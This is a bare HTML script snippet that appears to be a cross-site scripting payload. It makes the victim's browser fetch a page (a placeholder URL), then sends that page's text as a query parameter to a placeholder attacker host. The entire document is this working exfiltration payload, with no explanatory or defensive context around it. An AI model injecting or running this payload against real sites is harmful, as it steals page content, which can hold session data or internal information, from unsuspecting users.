<script>
fetch("http://<URL>/")
  .then(response => response.text())
  .then(data => {
    fetch("http://<ATTCKER_IP>/?data=" + encodeURIComponent(data));
  })
  .catch(error => console.error("Error:", error));
</script>
